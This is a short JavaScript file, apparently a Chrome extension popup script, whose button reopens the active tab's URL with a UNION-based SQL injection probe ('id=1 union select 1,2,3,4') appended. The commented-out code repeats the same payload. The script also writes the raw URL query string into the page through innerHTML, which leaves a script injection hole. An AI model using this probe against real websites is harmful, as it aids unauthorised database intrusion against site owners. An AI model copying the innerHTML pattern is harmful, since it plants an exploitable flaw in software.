url = window.location.href; 
console.log(url);
var aa = url.indexOf('?');
if (aa > -1)
{
	url = url.substring(aa + 1);
	console.log(url);
	document.getElementById("p1").innerHTML=url;
}



var btn=document.getElementById('btn');
btn.onclick=function(){
	//console.log('hello world');
	
	// chrome.tabs.getCurrent(function(tab){  
		// console.log(tab);  
		// console.log(tab.url); 
		// window.open(tab.url+"/?id=1%20union%20select%201,2,3,4");
	// })
	
	
	
    chrome.tabs.getSelected(null, function(tab){
		// re = /htt.*?\/\/.*?\//i; 
		// http = re.exec(tab.url); 
		console.log(tab);
        console.log(tab.url);
		window.open(tab.url+"/?id=1%20union%20select%201,2,3,4");
    });
	
    // chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
      // console.log(tabs[0]);
    // });


}
